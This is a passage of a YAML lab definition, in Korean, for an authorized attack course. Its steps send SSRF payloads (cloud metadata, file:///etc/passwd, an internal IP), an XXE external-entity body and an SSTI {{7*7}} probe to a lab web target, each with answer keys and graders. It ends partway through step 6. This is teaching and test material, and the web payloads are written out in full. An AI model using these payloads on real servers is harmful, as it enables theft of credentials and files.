lab_id: standalone-attack-adv-week04
title: "웹 고급 — SSRF·XXE·SSTI로 서버 내부를 공략한다"
version: standalone-attack-adv
course: attack-adv
week: 4
description: |
  공격 고급 W04 — 서버측 웹 취약점. 클라이언트측(XSS)을 넘어 서버 자체를 공략한다. SSRF(서버측 요청 위조로
  내부/클라우드 메타데이터 접근)·XXE(XML 외부 엔티티로 파일 읽기)·SSTI(템플릿 주입→RCE)를 페이로드로
  작성·전송하고 WAF/앱 응답을 해석한다. el34-attacker에서 인가 표적(el34-web)에. ⚠️ 인가된 실습만.
  ※ 정직 고지: 이 el34 표적엔 SSRF fetch·XML 파서·템플릿 평가 취약점이 실제로는 없다(SSRF=WAF 403 차단·
  XXE=/api/xml 404 부재·SSTI=49 미반사). 따라서 본 주차는 **페이로드 작성·전송·응답 해석까지**이며 실제
  악용은 미시연이다 — "취약 앱이었다면의 영향(IAM 탈취·파일 읽기·RCE)"은 각 단계 해석에 명시(W09 AD식 정직 처리).
difficulty: hard
duration_minutes: 185
prerequisites:
  - "attack-adv W01~W03 + web-vuln 트랙(SQLi/XSS) 통과"
  - "el34 호스트 SSH + docker exec, el34-attacker"
  - "lecture §2(SSRF) §3(XXE) §4(SSTI) 숙지"
objectives:
  - "SSRF로 내부/메타데이터 접근 페이로드 작성·전송"
  - "XXE 외부 엔티티·SSTI 표현식 페이로드 이해"
  - "서버측 취약점의 영향(RCE·내부 침투)과 방어 이해"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## STEP 1 — 서버측 공격 표면(admin vhost)을 확인한다
      > **이 단계에서 할 일:** 서버측 표적(admin.el34.lab)에 도달하는지 응답코드를 본다.
      > **왜:** 서버측 취약점은 서버가 입력을 '처리'하는 곳(URL fetch·XML 파싱·템플릿 렌더링)에서 생긴다.
      > 클라이언트측(XSS)보다 영향이 크다(서버 자체 장악). ⚠️ **인가된 el34 표적에만.**

      ### ▷ 그대로 입력

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      W=$(whatweb -a1 --colour=never http://admin.el34.lab/ 2>/dev/null)
      echo "$W" | grep -oE 'Apache\[[0-9.]+\]|\[[0-9]{3} [A-Za-z ]+\]' | head -2
      echo "$W" | grep -qiE 'Apache|HTTPServer' && echo serverside_ready
      ```

      ### ▷ 이렇게 나오면 정상 (실측 예)
      ```
      [403 Forbidden]
      Apache[2.4.52]
      serverside_ready
      ```

      ### ▷ 결과 해석
      whatweb가 adminconsole vhost에 도달해 지문(Apache 2.4.52)을 잡았고 `[403]`은 앞단 WAF(ModSec) 존재를
      뜻한다(서버측 취약 앱). 여기서 SSRF/XXE/SSTI 페이로드를 던져 응답을 관찰한다. 서버측은 '서버가 내
      입력으로 무엇을 하는가'를 노리는 공격이다.
    hint: '서버측 표면'
    category: survey
    points: 10
    answer: |
      ssh att@192.168.0.202 '
        # 서버측 표적(admin vhost) 도달·지문 (whatweb)
        W=$(whatweb -a1 --colour=never http://admin.el34.lab/ 2>/dev/null)
        echo "$W" | grep -oE "Apache\[[0-9.]+\]|\[[0-9]{3} [A-Za-z ]+\]" | head -2
        # 도달 시 서버측 표면 준비 마커
        echo "$W" | grep -qiE "Apache|HTTPServer" && echo serverside_ready
      '
    answer_detail: "서버측 표면 = 서버가 입력을 처리하는 지점(fetch/파싱/렌더). 클라이언트측(XSS)보다 영향이 큼."
    verify:
      type: output_contains
      expect: 'serverside_ready'
      field: stdout
      semantic: {intent: "서버측 표면", success_criteria: ["표적"], acceptable_methods: ["**[OSS] whatweb (권장)**"]}
    target_vm: web

  - order: 2
    instruction: |
      ## STEP 2 — SSRF ① 클라우드 메타데이터를 노린다
      > **이 단계에서 할 일:** 서버가 클라우드 메타데이터(169.254.169.254)를 대신 요청하게 하는 SSRF
      > 페이로드를 보내고 응답을 본다.
      > **왜:** SSRF는 서버가 공격자 지정 URL을 대신 요청하게 만든다. 외부에선 못 닿는 메타데이터에서
      > IAM 자격을 빼내는 게 클라우드 환경의 단골 표적이다.

      ### ▷ 그대로 입력

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=http://169.254.169.254/latest/meta-data/aa04test")  # curl-ok:크래프티드 SSRF 메타데이터 익스플로잇 — 특정 ?url= 파라미터, 스캐너 대체불가
      echo "ssrf_meta=$C (403=ModSec SSRF 룰 탐지)"
      [ -n "$C" ] && echo ssrf_meta_done
      ```

      ### ▷ 이렇게 나오면 정상 (실측 예)
      ```
      ssrf_meta=403 (403=ModSec SSRF 룰 탐지)
      ssrf_meta_done
      ```

      ### ▷ 결과 해석
      403 = ModSec이 169.254.169.254 같은 SSRF 패턴을 탐지·차단했다. 잘 구성된 WAF는 메타데이터 IP·
      file:// 스킴을 룰로 막는다. (WAF가 없거나 룰이 약하면 200으로 메타데이터가 그대로 반환돼 IAM 자격이 유출된다.)
    hint: 'SSRF 메타데이터'
    category: manipulation
    points: 12
    answer: |
      ssh att@192.168.0.202 '
        # SSRF 메타데이터 페이로드 전송 (크래프티드 curl)
        C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=http://169.254.169.254/latest/meta-data/aa04test")  # curl-ok:크래프티드 SSRF 메타데이터 익스플로잇, 스캐너 대체불가
        echo "ssrf_meta=$C (403=ModSec SSRF 룰 탐지)"
        # 응답 받았으면 마커
        [ -n "$C" ] && echo ssrf_meta_done
      '
    answer_detail: "SSRF 메타데이터 = 서버가 169.254.169.254를 대신 요청→IAM 자격 탈취. ModSec이 403 탐지."
    verify:
      type: output_contains
      expect: 'ssrf_meta_done'
      field: stdout
      semantic: {intent: "SSRF 메타데이터", success_criteria: ["169.254"], acceptable_methods: ["**[OSS] SSRF (권장)**"]}
    target_vm: web

  - order: 3
    instruction: |
      ## STEP 3 — SSRF ② 내부 파일·서비스로 피벗한다
      > **이 단계에서 할 일:** file:// 스킴(로컬 파일)과 내부 IP(비공개 서비스) 두 SSRF 페이로드를 보내
      > 응답을 본다.
      > **왜:** SSRF는 메타데이터뿐 아니라 file://로 서버 파일을, 내부 IP로 외부엔 안 보이는 서비스를
      > 노린다 — 서버를 프록시 삼아 내부망으로 피벗하는 발판.

      ### ▷ 그대로 입력

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      F=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=file:///etc/passwd%23aa04test"); echo "file=$F"  # curl-ok:크래프티드 SSRF file:// LFI 익스플로잇
      I=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=http://10.20.30.5:8080/aa04test"); echo "internal=$I"  # curl-ok:크래프티드 SSRF 내부서비스 피벗
      [ -n "$F" ] && [ -n "$I" ] && echo ssrf_internal_done
      ```

      ### ▷ 이렇게 나오면 정상 (실측 예)
      ```
      file=403
      internal=403
      ssrf_internal_done
      ```

      ### ▷ 결과 해석
      둘 다 403 = WAF가 file:// 스킴과 내부 IP SSRF를 막았다. 방어가 없으면 file://는 /etc/passwd를
      읽어 오고, 내부 IP SSRF는 외부에 노출 안 된 관리 서비스(예: 10.20.30.5:8080)를 서버를 통해 두드린다.
    hint: 'SSRF 내부'
    category: analysis
    points: 14
    answer: |
      ssh att@192.168.0.202 '
        # file:// 로컬 파일 읽기 시도 (크래프티드 curl)
        F=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=file:///etc/passwd%23aa04test"); echo "file=$F"  # curl-ok:크래프티드 SSRF file:// LFI 익스플로잇
        # 내부 IP 비공개 서비스 접근 시도 (크래프티드 curl)
        I=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=http://10.20.30.5:8080/aa04test"); echo "internal=$I"  # curl-ok:크래프티드 SSRF 내부서비스 피벗
        # 두 응답 받았으면 마커
        [ -n "$F" ] && [ -n "$I" ] && echo ssrf_internal_done
      '
    answer_detail: "SSRF 내부 = file://(파일)·내부 IP(비공개 서비스). 서버를 프록시 삼아 내부망 피벗. ModSec 탐지."
    verify:
      type: output_contains
      expect: 'ssrf_internal_done'
      field: stdout
      semantic: {intent: "SSRF 내부", success_criteria: ["file/내부IP"], acceptable_methods: ["**[OSS] SSRF (권장)**"]}
    target_vm: web

  - order: 4
    instruction: |
      ## STEP 4 — XXE: XML 외부 엔티티로 파일을 읽는다
      > **이 단계에서 할 일:** 외부 엔티티(SYSTEM file://)를 정의한 XML을 /api/xml에 보내 응답을 본다.
      > **왜:** XXE는 XML 파서가 외부 엔티티를 처리하게 해 서버 파일을 읽거나 SSRF로 연결한다.

      ### ▷ 그대로 입력

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      B='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>aa04test&x;</r>'
      C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 -X POST -H "Content-Type: application/xml" --data "$B" "http://admin.el34.lab/api/xml")  # curl-ok:크래프티드 XXE 외부엔티티 바디 익스플로잇 — POST XML, 스캐너 대체불가
      echo "xxe=$C"
      [ -n "$C" ] && echo xxe_done
      ```

      ### ▷ 이렇게 나오면 정상 (실측 예)
      ```
      xxe=404
      xxe_done
      ```

      ### ▷ 결과 해석
      여기선 404 = 이 앱엔 /api/xml(XML을 받는) 엔드포인트가 없다는 뜻(페이로드 자체는 올바르다 — 받아줄
      파서가 없을 뿐). 실제 XXE 취약 앱이라면 외부 엔티티 `&x;`가 /etc/hostname 내용으로 치환돼 응답에
      섞여 나온다. 방어: XML 파서에서 외부 엔티티·DTD 처리 비활성화(`disallow-doctype-decl`).
    hint: 'XXE'
    category: analysis
    points: 14
    answer: |
      ssh att@192.168.0.202 '
        # XXE 외부 엔티티 XML 페이로드 전송 (크래프티드 curl POST)
        B="<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>aa04test&x;</r>"
        C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 -X POST -H "Content-Type: application/xml" --data "$B" "http://admin.el34.lab/api/xml")  # curl-ok:크래프티드 XXE 외부엔티티 바디 익스플로잇, 스캐너 대체불가
        echo "xxe=$C"
        # 응답 받았으면 마커
        [ -n "$C" ] && echo xxe_done
      '
    answer_detail: "XXE = XML 외부 엔티티로 파일 읽기/SSRF. 방어는 파서의 외부 엔티티·DTD 비활성화."
    verify:
      type: output_contains
      expect: 'xxe_done'
      field: stdout
      semantic: {intent: "XXE", success_criteria: ["외부 엔티티"], acceptable_methods: ["**[OSS] XXE (권장)**"]}
    target_vm: web

  - order: 5
    instruction: |
      ## STEP 5 — SSTI: 서버측 템플릿 주입을 탐지한다
      > **이 단계에서 할 일:** `{{7*7}}`를 입력으로 보내, 응답에 49가 반사되는지 본다.
      > **왜:** 사용자 입력이 템플릿 엔진으로 '평가'되면 `{{7*7}}`이 49로 계산돼 나온다. 49가 보이면
      > 템플릿 평가(SSTI) = RCE로 가는 길이다.

      ### ▷ 그대로 입력

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      curl -s --max-time 6 "http://admin.el34.lab/?name=%7B%7B7*7%7D%7Daa04test" | grep -oE "49|aa04test" | head  # curl-ok:크래프티드 SSTI {{7*7}} 탐지 페이로드
      echo "(49 반사면 SSTI 취약, 다음 단계는 RCE)"
      curl -s -o /dev/null --max-time 6 "http://admin.el34.lab/?name=%7B%7B7*7%7D%7D" && echo ssti_done  # curl-ok:크래프티드 SSTI 페이로드 전송
      ```

      ### ▷ 이렇게 나오면 정상 (실측 예)
      ```
      (49 반사면 SSTI 취약, 다음 단계는 RCE)
      ssti_done
      ```

      ### ▷ 결과 해석
      여기선 49도 aa04test도 반사되지 않았다(grep 결과 비어 있음) = 이 앱은 name 입력을 템플릿으로 평가하지
      않는다 → SSTI 취약 아님. 취약하다면 `49`가 응답에 찍힌다. 취약 시엔 엔진별 RCE 페이로드
      (Jinja2 `{{config.__class__...}}`, Twig `{{_self.env...}}`)로 명령 실행까지 확장한다. 방어: 사용자
      입력을 절대 템플릿으로 렌더하지 않기(데이터로만 전달).
    hint: 'SSTI'
    category: analysis
    points: 14
    answer: |
      ssh att@192.168.0.202 '
        # {{7*7}} 탐지 페이로드 전송 → 49/aa04test 반사 확인 (크래프티드 curl)
        curl -s --max-time 6 "http://admin.el34.lab/?name=%7B%7B7*7%7D%7Daa04test" | grep -oE "49|aa04test" | head  # curl-ok:크래프티드 SSTI {{7*7}} 탐지 페이로드
        echo "(49 반사면 SSTI 취약, 다음 단계는 RCE)"
        # 페이로드 전송됐으면 마커
        curl -s -o /dev/null --max-time 6 "http://admin.el34.lab/?name=%7B%7B7*7%7D%7D" && echo ssti_done  # curl-ok:크래프티드 SSTI 페이로드 전송
      '
    answer_detail: "SSTI = 입력이 템플릿으로 평가({{7*7}}→49). RCE로 확장 가능. 방어는 입력의 템플릿 평가 금지(샌드박스)."
    verify:
      type: output_contains
      expect: 'ssti_done'
      field: stdout
      semantic: {intent: "SSTI", success_criteria: ["템플릿 평가"], acceptable_methods: ["**[OSS] SSTI (권장)**"]}
    target_vm: web

  - order: 6
    instruction: |
      ## STEP 6 — 영향 연쇄: 서버측 취약점이 서버를 장악한다
      > **이 단계에서 할 일:** SSRF 메타데이터·file 페이로드를 보내, 몇 개가 서버에 '도달'(응답≠000)했는지 센다.
      > **왜:** 서버측 취약점은 클라이언트가 아니라 서버 자체를 장악한다(SSRF→클라우드 자격/내부 피벗,
      > XXE→파일, SSTI→RCE). 페이로드가 서버에 닿는다는 것 자체가 공격 표면이다.

      ### ▷ 그대로 입력

      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.

      ```bash
      M=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=http://169.254.169.254/")  # curl-ok:크래프티드 SSRF 메타데이터
      F=$(curl -s -o /dev/null -w "%{http_code}" --max-time 6 "http://admin.el34.lab/files/read?url=file:///etc/passwd")  # curl-ok:크래프티드 SSRF file:// LFI
      echo "SSRF메타=$M SSRF파일=$F"
      CNT=0
      [ "$M" != "000" ] && CNT=$((CNT+1))
      [ "$F" != "000" ] && CNT=$((CNT+1))
      echo "도달 페이로드: $CNT/2"
      [ "$CNT" -ge 1 ] && echo impact_done
      ```

      ### ▷ 이렇게 나오면 정상 (실측 예)
      ```
      SSRF메타=403 SSRF파일=403
      도달 페이로드: 2/2
      impact_done
      ```

      ### ▷ 결과 해석
